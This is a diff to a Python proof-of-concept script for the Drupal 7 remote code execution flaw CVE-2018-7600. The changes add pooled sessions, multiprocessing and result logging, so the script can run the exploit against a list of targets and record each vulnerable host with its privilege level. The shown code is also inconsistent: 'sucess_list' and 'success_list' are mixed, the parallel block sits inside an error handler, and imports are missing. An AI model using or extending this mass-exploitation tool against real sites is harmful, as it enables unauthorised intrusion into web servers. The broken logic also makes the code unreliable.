@@ -22,12 +22,21 @@ def poc(target):
             rule2 = re.compile(r'(.*?)\[{"command":"settings","settings":.*?')
             parsed_result=rule2.findall(r.text.replace('\n','').replace(' ','').replace('\r','').replace('\t',''))
             if parsed_result and len(parsed_result[0])>0:
-                print(("vulnerable target: "+    target+    "\n當前權限:"+    parsed_result[0]))
-                return ("vulnerable target:"+    target+    "\n當前權限:"+    parsed_result[0])
+                result = "vulnerable target: " + target + "\n當前權限: " + parsed_result[0]
+                print(result)
+                sucess_list.append(result)
+                return result
     except:
         pass
+
+# 創建一個會話並設置連接池的大小
+session = requests.Session()
+adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
+session.mount('http://', adapter)
+
 try:
-    with open('/home/kali/Desktop/PoC/CVE-2018-7600-Drupal7/target.txt') as file: # target.txt 路徑
+    sucess_list = []
+    with open('/home/kali/Desktop/PoC/CVE-2018-7600-Drupal7/target.txt') as file:
         url_list = file.readlines()
         for url in url_list:
            target_url = url.strip()
@@ -37,3 +46,16 @@ except FileNotFoundError:
     print('當前路徑找不到 target.txt')
 except IOError:
     print('文件權限錯誤,無法讀取')
+
+    # 使用Manager来创建共享列表，用于存储结果
+    manager = Manager()
+    success_list = manager.list()
+
+    # 使用 multiprocessing.Pool 來並行處理URL列表
+    with Pool(processes=4) as pool:  # 調整進程速量
+        pool.map(poc, url_list)
+
+if sucess_list:
+    with open('/home/kali/Desktop/PoC/CVE-2018-7600-Drupal7/sucess.txt','w') as f:
+        for result in sucess_list:
+            f.write(result + '\n')
